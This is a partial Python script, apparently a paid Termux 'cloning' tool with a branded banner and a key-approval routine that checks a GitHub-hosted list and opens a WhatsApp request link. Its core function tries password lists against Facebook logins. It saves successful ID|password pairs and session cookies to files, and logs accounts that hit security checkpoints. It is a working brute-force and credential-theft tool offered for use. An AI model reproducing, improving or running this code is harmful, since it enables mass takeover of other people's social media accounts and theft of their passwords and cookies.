...
logo=(f"""{GREEN}
 ⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ...
   {GREEN}
\033[93;1m════════════════════════════════════════════════
\033[96;1mF4C3B00K  : [Khalil] [ MALIK]
\033[96;1mY0UTUB3   : [Khalil] [TRICKS]
\033[96;1mV3RS10N   : [10.49] [PAID]
\033[96;1m0WN3R     : [Khalil] [MALIK]
\033[96;1m  My Life My World Life💗S
\033[93;1m════════════════════════════════════════════════
\033[96;1m[-]Khalil ON FAIR: ID Save /sdcard/Luffy-OK/Khalil-COOKIE
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[Khalil-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m[Khalil-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Khalil-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/Dani-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[Khalil-CP]  '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Khalil-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/Khalil-OK.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KhalilـOK.txt','a').write(str(uid)+'|'+pas+'\n')                                        
                                        oks.append(str(uid))
                                        break
...
def approval():
  ...
  sxb = 'Dani'
  try:
    httpCaht = requests.get(f'https://raw.githubusercontent.com/DaniMalik2/paid/main/Saba.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Mr-Dani%20Sir%20!%20Please%20Approve%20My%20Key%20The%20King%20Key%20Is%20:%20'+id);os.system('am start https://api.whatsapp.com/send?phone=+923485738314&text=')
      time.sleep(1)
      approval()
  except:
    sys.exit()
